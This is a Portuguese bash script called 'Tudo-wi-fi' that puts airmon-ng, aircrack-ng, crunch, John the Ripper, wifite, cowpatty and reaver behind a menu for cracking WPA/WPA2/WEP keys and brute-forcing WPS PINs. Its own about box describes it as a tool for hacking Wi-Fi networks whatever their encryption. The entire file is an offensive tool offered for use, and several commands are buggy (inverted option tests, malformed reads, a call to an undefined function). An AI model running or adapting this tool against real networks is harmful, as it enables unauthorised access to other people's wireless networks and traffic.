#! /bin/bash

cyan='\e[0;36m'
green='\e[0;32m'
lightgreen='\e[0;32m'
white='\e[0;37m'
red='\e[0;31m'
yellow='\e[0;33m'
blue='\e[0;34m'
purple='\e[0;35m'
orange='\e[38;5;166m'

terminal="Tudowi-fi :# "



function placa {

        printf "\n"
        whiptail --title "Placa em monitor" --yesno "Deseja colocar a placa em modo monitor? é importante para capturar os pacotes! Mas se ja está em modo monitor prima em NÃO." --fb 12 65
        if [ $? -eq 0 ];then
		printf "\n"
		echo -e $red "             para activar |Y| para desativar |d| para cancelar |n|"
		echo -e $red "                                  Placa wi-fi                     "
		printf "\n"
		echo -e $blue ""
                read -p "$terminal y|n|d :" t
                if [ $t = "y" ] || [ $t = "yes" ] || [ $t = "Y" ];then
                                echo -e $white "Enter com a interface de rede:"
                                printf "exemplo: para ver digite\n => ifconfig\n "
                                echo -e $blue" "
				read -p "$terminal" iface
              			airmon-ng start $iface
				capt="Interceptador/monitorar.sh"
                                capt1="Interceptador/bloquear.sh"
                                cd Interceptador/
                                chmod +x $capt
                                chmod 775 $capt1
                                whiptail --title "Monitorar" --msgbox "A shell que abrirá em seguida é onde será executado o scripts para monitorar a rede digite na shell #: monitorar" --fb 13 60
                           sleep 4
				gnome-terminal | grep $capt 
                           #sleep 4 whiptail --title "Monitorar" --infobox "A shell que abrirá em seguida é onde derrubaremos a rede toda ou um cliente conectado" --fb 10 50
                                #gnome-terminal | grep $capt | ./bloquear.sh

				fi
	
			if [ $t = "D" ] || [ $t = "d" ];then
			echo -e $white "Enter com a interface em monitor para desativar:"
			printf "exemplo: digete para ver a iface\n => iwconfig"
			echo -e $blue " "
			read -p "$terminal  " iface
			airmon-ng stop $iface

		else
			echo "parametro incorreto"

                        fi
               else
            
               cd Interceptador/
                         sleep 4
                              capt="Interceptador/monitorar.sh"
                              
                               chmod +x monitorar.sh
                               chmod 775 bloquear.sh

                               whiptail --title "Monitorar" --msgbox "A shell que abrirá em seguida é onde será executado o script para monitorar a rede digite na shell #: monitorar" --fb 13 60
               sleep 3
             
				gnome-terminal 
        fi
	printf "\n"

       }

function aircrack {
                  placa
echo -e $green "processando..."
sleep 5
echo -e $orange  "--------------------------------------------------------------------------------"
echo -e $orange  "--                                                                            --"
echo -e $orange  "--            Entre 1 para iniciar o atack  aircrack com Word List            --"
echo -e $orange  "--            Entre 2 para iniciar o atack  aircrack com Crunch               --"
echo -e $orange  "--            Entre 3 para iniciar o atack  aircrack com Jhon                 --"
echo -e $orange  "--            Entre 99 pata voltar ao menu                                    --"
echo -e $orange  "--------------------------------------------------------------------------------"
echo -e $orange  "--------------------------------------------------------------------------------"

read -p "$terminal" ler

if [ $ler = "1" ]
then
sleep 2
placa
echo -e $blue "                      ---------------------------------------                                 "
echo -e $blue "                     |Enter com o pacote Capturado ou Caminho|                                "
echo -e $blue "                      ---------------------------------------                                 "

whiptail --title "Pacote.cap" --infobox "Exemplo: /home/directorio/arquivo.cap" --fb 10 50

printf "\n"
echo -e $red "exemplo: /home/directorio/arquivo.cap"
echo -e $red "ou arquivo.cap"
echo -e $blue
read -p " $terminal" pacote
printf "\n"
echo "                                 -----------------------------------"
echo "                                |Enter com a Word List ou Dicionario|                               --"
echo "                                 -----------------------------------"

whiptail --title "wordlist" --infobox "Exemplo: /home/directorio/wordlist.txt ou .lst" --fb 10 50

printf "\n"
echo -e $red "exemplo: /home/directorio/wordlist.txt ou .lst"
echo -e $red "ou wordlist.lst"
echo -e $blue " "
read -p "$terminal " wordlist
printf "\n \n"

aircrack-ng $pacote -w $wordlist
fi

if [ $ler = "2" ]
then
sleep 2
placa
echo "-------------------------------------------------------------------------------------------"
echo "|                              Enter 1 para Crunch Manual                                 |"
echo "|                           Enter 2 para Crunch com Wordlist                              |"
echo "-------------------------------------------------------------------------------------------"
printf "\n"
echo -e $white "Placa Wifi em modo Monitor é Obrigatorio!"
printf "\n"
read -p "$terminal " crun

if [ $crun = "1" ]
then
sleep 2
echo -e $blue "------------------------------------------------------------------------------------------"
echo -e $blue "|                       Enter com o Valor Minimo da wordlist                              |"
printf "\n"
read -p "$terminal" n1
printf "\n"
echo -e $blue "|                       Enter com o Valor Maximo da wordlist                              |"
printf "\n"
read -p "$terminal" n2
printf "\n"
echo -e $blue "|                       Enter com as possiveis palavras/Numeros                            |"

printf "\n"
echo -e $red "exemplo: abcderghijklmnop... 12345667890 ..."
echo -e $red "pode-se tambem juntar letrar e numeros "
printf "\n"
echo -e $blue" "
read -p "$terminal" palavra
printf "\n"
echo -e $blue "|                        Enter com o pacote Capturado da rede                              |"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"
read -p "$terminal" pacote
printf "\n"
echo -e $blue "|                             Enter com nome da rede                                       |"
read -p "$terminal" rede
sleep 5
printf "\n"

crunch $n1 $n2 $palavra | aircrack-ng $pacote -w --c $rede
 
elif [ $crun = "2" ]
then
printf "\n"
echo "|                            Enter com o Valor Minimo                                  |"
printf "\n"
read -p "$terminal" n1
echo "|                           Enter com o Valor Maximo                                 --"
printf "\n"
read -p "$terminal" n2
echo "|                        Enter com o caminho e a wordlist                            --"
printf "\n"
echo -e $red "exemplo: /usr/share/crunch/charset.lst hex-lower "
echo -e $blue " "
printf "\n"
read -p "$terminal" caminho
echo "|                           Enter com pacote capturado                               --"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"

echo -e $blue " "
read -p "$terminal" pacote
printf "\n"
echo "|                             Enter com nome da rede                                 --"
read -p "$terminal" nome
echo "----------------------------------------------------------------------------------------"
sleep 5
printf "\n"
crunch $n1 $n2 -f $caminho | aircrack-ng $pacote -w --c $nome
else 
echo -e $red "                        Parametros errado...                                    "
fi
fi

      if [ $ler = "3" ]
then
	placa
echo "----------------------------------------------------------------------------------------"
echo "--                                 Enter 1 para wordlist                              --"
echo "--                               Enter 2 para forca bruta                             --"
echo "--                       Enter 3 para Iniciar uma sessão de atack                     --"
echo "--                  Enter 4 para Restaurar a sessão de atack ja Iniciada              --"
printf "\n"
echo -e $white "obs: Placa Wifi em modo Monitor é Obrigatorio!"
printf "\n"
echo -e $blue ""
read -p "$terminal" n1

if [ "$n1" = "1" ]
then
echo -e $blue "---------------------------------------------------------------------------------------"
echo "|                                Enter  com Wordlist                                  |"
printf "\n"
echo -e $red "exemplo: /home/directorio/wordlist.txt ou .lst"
echo -e $red "ou wordlist.lst"
printf "\n"
echo -e $blue" "
read -p "$terminal" wordlist
echo "|                             Enter  com o MAC da REDE                                |"
read -p "$terminal" mac 
echo "|                         Enter  com o arquivo capturado                              |"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"
echo -e $blue" "
read -p "$terminal" captura
echo"----------------------------------------------------------------------------------------"
sleep 2
john --wordlist=$wordlist --stdout | aircrack-ng --bssid $mac -w -$captura

elif [ "$n1" = "2" ]
then
sleep 3
echo -e $blue" "
echo "---------------------------------------------------------------------------------------"
echo "|                                                                                     |"

echo "|                                 Enter 1 com o MAC da REDE                           |"
read -p "$terminal" mac 
echo "|                              Enter 2 com o arquivo capturado                        |"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"
echo -e $blue " "
read -p "$terminal" captura
echo"----------------------------------------------------------------------------------------"
echo "carregango..."
sleep 5
john --incremental --stdout | aircrack-ng --bssid $mac -w -$captura

elif [ "$n1" = "3" ]
then
sleep 5
echo -e $blue " "
echo "---------------------------------------------------------------------------------------"
echo "|                             Enter com nome da sessão                                |"
printf "\n"
echo -e $red "exemplo: /home/directorio/nome_sessão"
echo -e $red "ou nome_da_sessão"
printf "\n"
echo -e $blue " "
read -p "$terminal" nome
echo "|                                Enter  com Wordlist                                  |"
printf "\n"
echo -e $red "exemplo: /home/directorio/wordlist.txt ou .lst"
echo -e $red "ou wordlist.lst"
printf "\n"
echo -e $blue " "
read -p "$terminal" wordlist
echo "|                             Enter  com o MAC da REDE                                |"
read -p "$terminal" mac 
echo "|                          Enter com o arquivo capturado                              |"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"
echo -e $blue" "
read -p "$terminal" captura
echo"----------------------------------------------------------------------------------------"
echo -e $yellow "carregando..."

john --session=$nome --wordlist=$wordlist --stdout | aircrack-ng --bssid $mac -w -$captura 

elif [ "$n1" = "4" ]
then
sleep 3
echo -e $blue " "
echo "---------------------------------------------------------------------------------------"
echo "|                              Enter com nome da sessão                              |"
printf "\n"
echo -e $red "exemplo: /home/directorio/nome_sessão"
echo -e $red "ou nome_sessão"
printf "\n"
echo -e $blue " "
read "terminal" nome
echo "|                              Enter  com o MAC da REDE                              |"
read "$terminal" mac 
echo "|                            Enter  com o arquivo capturado                          |"
printf "\n"
echo -e $red "exemplo: /home/directorio/pacote.cap"
echo -e $red "ou pacote.cap"
printf "\n"
echo -e $blue" "
read "$terminal" captura
sleep 5

john --restore=$nome | aircrack-ng --bssid $mac -w -$captura 
else echo -e $red"--                     Parametros errado                                  --"
fi
fi
if [ $ler = "99" ];then
 reset
 logo  
 menu

fi
}

function logo {
echo -e $blue  "           oooooooooo oo     oo ooooooooo ooooooooo  "
echo -e $blue  "           oooooooooo oo     oo ooooooooo ooooooooo "
echo -e $blue  "               oo     oo     oo o     ooo oo     oo "
echo -e $blue  "               oo     oo     oo o      oo oo     oo "
echo -e $blue  "               oo     oo     oo o     ooo oo     oo "
echo -e $blue  "               oo     ooooooooo ooooooooo ooooooooo "
echo -e $blue  "               oo     ooooooooo ooooooooo ooooooooo "
echo -e $blue  "                                                "
echo -e $blue  "            ss             ss  ss       ssssssss  ss "
echo -e $blue  "             ss           ss   ss       ss        ss "
echo -e $blue  "             ss           ss   ss       ss        ss "
echo -e $blue  "             ss   ssss    ss   ss  sss  ssssssss  ss "
echo -e $blue  "              ss  ss ss  ss    ss       ss        ss "
echo -e $blue  "               ss ss ss ss     ss       ss        ss "
echo -e $blue  "                ss     ss      ss       ss        ss "
echo -e $blue "                                                     "
echo -e $blue "                                       EMAIL:casteloabraao@gmail.com"

}

function carregar {
echo -e $purple "Carregando..."
sleep 5
echo -e $cyan "---------------------------------------------------------------------"
echo -e $cyan "--                        BEM VINDO AO MENU                        --"
echo -e $cyan "--                            ººººººººº                            --"
echo -e $cyan "---------------------------------------------------------------------"

echo -e $purple "Carregando o Menu... "
sleep 6
}

logo
carregar
function menu {

echo -e $cyan "                                                                                                           Tudo-wi-fi: "
echo -e $yellow "               (1)-        AIRCRACK-NG    //força bruta WPA,WPA2 placa em modo monitor obrigatorio"
echo -e $yellow "               (2)-          WIFITE       //quebra criptografia WEP "
echo -e $yellow "               (3)-         COWPATTY      //força bruta WPA,WPA2-psk placa em modo monitor obrigatorio "
echo -e $yellow "               (4)-          REAVER       //força bruta WPA,WPA2 em WPS "
echo -e $yellow "               (5)-           SOBRE       //--------------------------- "
echo -e $yellow "               (6)-           AJUDA       //--------------------------- "
echo -e $yellow "               (99)-          SAIR        //--------------------------- "

printf "\n"

read -p "$terminal " opcao

case $opcao in

1)
reset
logo
aircrack
;;

2)
reset
logo
wifite
;;

3)
reset 
logo

if [ -f Interceptador/monitorar.sh ]
         then
            
           printf "\n"
           echo -e $blue  " =================================================================== "
           echo -e $yellow " Desejas abrir um terminal novo para iniciar a captura dos pacotes? "
           echo -e $blue  " =================================================================== "
           printf "\n"
           read -p "$terminal s|n " x

           if [ $x = "s" ] || [ $x = "S" ];then
                  cd Interceptador/
                              capt="Interceptador/monitorar.sh"
                                chmod +x monitorar.sh
                  whiptail --title "Capturar pacotes" --msgbox "No terminal novo digite 'monitorar' sem aspas " --fb 10 40                 
          
                      gnome-terminal
                fi
             
         sleep 5
         printf "\n"
         echo -e $blue "                ======================================   "
         echo -e $blue "                   Entra com o caminho da WORDLIST       "
         echo -e $blue "                ======================================   "
         printf "\n"
         echo -e $red "                 Exemplo:/home/computador/wordlist.lst "
         echo -e $red "            dependentimente onde está o caminho da sua wordlist "
         printf "\n"
         
         read -p "$terminal" wordlist

         printf "\n"
         echo -e $blue "      ===================================================================   "
         echo -e $blue "         Entra com o caminho do arquivo capturado .cap com |airodump|       "
         echo -e $blue "      ===================================================================   "
         printf "\n"
         echo -e $red "                 Exemplo:/home/computador/cowpatty-01.cap "
         echo -e $red "      lembrando que salvaste o arquivo cowpatty com a captura com airodump "
         printf "\n"
         
         read -p "$terminal" arquivo

         printf "\n"
         echo -e $blue "                ======================================   "
         echo -e $blue "                       Entra com o nome da rede          "
         echo -e $blue "                ======================================   "
         printf "\n"
         
         read -p "$terminal" $rede
         printf "\n começando o ataque..."
         sleep 3
         cowpatty -f $wordlist -r $arquivo -s $rede
         reset
         logo
         recarregar
         menu
    else 
             printf "\n"
         echo -e $red "                 =========================================   "
         echo -e $red "                 Infelizmente o arquivo monitor não existe   "
         echo -e $red "                 =========================================   "
         printf "\n" 
         reset
         logo
         recarregar
         menu  
   fi

;;

4)
reset
logo
           echo -e $blue  " =================================================================== "
           echo -e $yellow "         (1) Para hackear sem o PIN do WPS da WI-FI " 
           echo -e $yellow "         (2) Para hackear com o PIN do WPS da WI-FI " 
           echo -e $yellow "     ( A placa em modo monitor, Obrigatorio nas duas opções) " 
           echo -e $blue  " =================================================================== "
           printf "\n"
           
             read -p "$terminal " c            

 function reavers {
         printf "\n"
         echo -e $red  "                ======================================   "
         echo -e $blue "                 Entra com o nome da rede (Opcional)     "
         echo -e $red  "                ======================================   "
         printf "\n"
           read -p "$terminal" rede
                       if [ -n $rede ];then
                        red="" ;
                        else
                        red="-e $rede"
                        fi
          printf "\n"
         echo -e $red  "                ======================================   "
         echo -e $blue "                 Entra com o canal da rede (Opcional)    "
         echo -e $red  "                ======================================   "
         printf "\n"
           read -p "$terminal" canal

                       if [ -n $canal ];then
                        can="" ;
                        else
                        can="-c $canal"
                        fi
         printf "\n"
         echo -e $red  "                ======================================   "
         echo -e $blue "              Entra com a Interface de rede (obrigatorio)         "
         echo -e $red  "                ======================================   "
         printf "\n"
           read -p "$terminal" iface

         printf "\n"
         echo -e $red  "                ======================================   "
         echo -e $blue "             Entra com o endereço MAC da rede (obrigatorio)          "
         echo -e $red  "                ======================================   "
         printf "\n"
           read -p "$terminal" mac
 
}

           if [ $c -eq 1 ]
                    then
                          reavers
                          echo "hackeando..."
                          sleep 5
                          reaver -i $iface -b $mac $red $can -vv
                          menu
             elif [ $c -eq 2 ];then

                       printf "\n"
         echo -e $red  "                ======================================   "
         echo -e $blue "             Entra com o PIN do (wps)da rede (Obrigatorio)    "
         echo -e $red  "                ======================================   "
         printf "\n"
        read -p "$terminal " pin
                          reavers
                          echo "hackeando..."
                          sleep 5

                          reaver -i $iface -b $mac $red $can -p $pin -vv
                          menu
	       	fi
		
;;

5)

whiptail --title "Sobre o Tudo-Fi" --msgbox "É um script que permite hackear rede wifi imdependentimente da sua criptografia ele usa algumas das ferramentas mais conhecidas de hacker que são (aircrack-ng,wifite,reaver e cowpatty) minimizando a inserção de todos os parametros que os programas pedem para a execução, facilitando assim o usuario. foi desemvolvido por Abraão Castelo: email => casteloabraao@gmail.com" --fb 17 60
reset
logo
carregar
menu
;;

6)

whiptail --title "Ajuda" --msgbox "para informações de ajuda, de como usar o script contacte o criador do script FACEBOOK:Abraham Castle Herdeiro ou EMAIL: casteloabraao@gmail.com ,nos ajude a melhora-lo. obrigado." --fb 13 40
reset
logo
carregar
menu
;;

99)
 printf " Saindo..\n mais informações \n Email:casteloabraao@gmail.com \n "
 sleep 3
 exit 0
;;

*)

;;
esac

}

menu


